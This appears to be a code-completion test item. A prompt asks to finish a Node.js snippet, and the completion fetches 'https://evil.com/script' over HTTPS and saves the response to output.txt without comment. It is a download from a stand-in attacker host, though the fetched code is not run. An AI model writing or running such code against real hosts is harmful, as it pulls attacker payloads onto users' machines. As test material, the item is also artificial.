/// prompt start
// Finish the code.

// var https = require("https");
// var fs = require("fs");

// https.get('https://evil.com/script', res => {
/// prompt end
var https = require("https");
var fs = require("fs");

https.get('https://evil.com/script', res => {
  let data = '';

  // A chunk of data has been received.
  res.on('data', chunk => {
    data += chunk;
  });

  // The whole response has been received.
  res.on('end', () => {
    // Do something with the data, for example, write it to a file.
    fs.writeFile('output.txt', data, (err) => {
      if (err) throw err;
      console.log('Data has been written to output.txt');
    });
  });

}).on('error', (err) => {
  console.error(`Error: ${err.message}`);
});